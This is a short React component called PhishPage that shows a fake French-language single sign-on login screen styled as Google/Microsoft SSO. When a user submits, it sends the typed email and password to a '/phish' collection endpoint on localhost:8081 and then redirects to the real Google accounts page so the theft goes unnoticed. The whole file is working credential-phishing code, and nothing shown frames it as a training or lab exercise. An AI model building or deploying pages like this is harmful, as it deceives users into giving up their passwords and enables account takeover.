import React, { useState } from "react";

export default function PhishPage() {
  const [email, setEmail] = useState("");
  const [passcode, setPasscode] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    await fetch("http://localhost:8081/phish", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ email, passcode }),
    });
    window.location.href = "https://accounts.google.com";
  };

  return (
    <div className="d-flex justify-content-center align-items-center vh-100 bg-light">
      <form onSubmit={handleSubmit} className="bg-white p-4 rounded shadow" style={{ width: "320px" }}>
        <h4 className="text-center mb-3">Connexion SSO sécurisée</h4>
        <input
          type="email"
          className="form-control mb-2"
          placeholder="Adresse email"
          required
          value={email}
          onChange={e => setEmail(e.target.value)}
        />
        <input
          type="password"
          className="form-control mb-3"
          placeholder="Mot de passe"
          required
          value={passcode}
          onChange={e => setPasscode(e.target.value)}
        />
        <button className="btn btn-primary w-100" type="submit">Connexion</button>
        <div className="text-muted text-center small mt-2">SSO via Google / Microsoft</div>
      </form>
    </div>
  );
}
